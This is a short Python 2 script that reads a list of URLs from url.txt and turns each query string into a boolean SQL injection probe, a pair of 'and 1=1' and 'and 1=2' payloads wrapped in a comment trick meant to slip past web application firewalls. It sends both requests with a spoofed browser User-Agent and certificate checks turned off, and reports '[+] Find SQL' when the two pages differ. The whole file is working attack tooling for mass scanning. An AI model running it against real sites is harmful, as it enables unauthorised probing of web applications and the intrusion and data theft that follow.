#!/usr/bin/python
#-*- coding:utf-8 -*-
import requests
import re
import urllib3
urllib3.disable_warnings()

urls = []
def url_bypass(url):
    r = r'\?(.*)'
    id = re.findall(r,url)
    id = id[0]
    payload = "?a=/*&{}%20and%201=1%23*/".format(id)

    r2 = r'\?(.*)'
    id2 = re.findall(r2,url)
    id2 = id2[0]
    payload2 = "?a=/*&{}%20and%201=2%23*/".format(id2)

    urlr = '(.*)\?%s'%id
    url_ = re.findall(urlr,url)
    url_=url_[0]
    url_bypass =  url_+payload
    url_bypass2 = url_ + payload2
    urls.append(url_bypass)
    urls.append(url_bypass2)

def req1(url):
    global html1
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3314.0 Safari/537.36 SE 2.X MetaSr 1.0'
    }
    req = requests.get(url,headers=headers,verify=False,timeout=3)
    html1 = req.content

def req2(url):
    global html2
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3314.0 Safari/537.36 SE 2.X MetaSr 1.0'
    }
    req = requests.get(url,headers=headers,verify=False,timeout=3)
    html2 = req.content

def main():
    try:
        req1(urls[0])
        req2(urls[1])
        if html1 != html2:
            print "[+] Find SQL",urls[1]
        else:
            pass
    except:
        pass

if __name__ == '__main__':
    f = open('url.txt','r')
    for url in f:
        url = url.strip()
        url_bypass(url)  # c处理url
        main() #判断SQL
        urls = [] #清空列表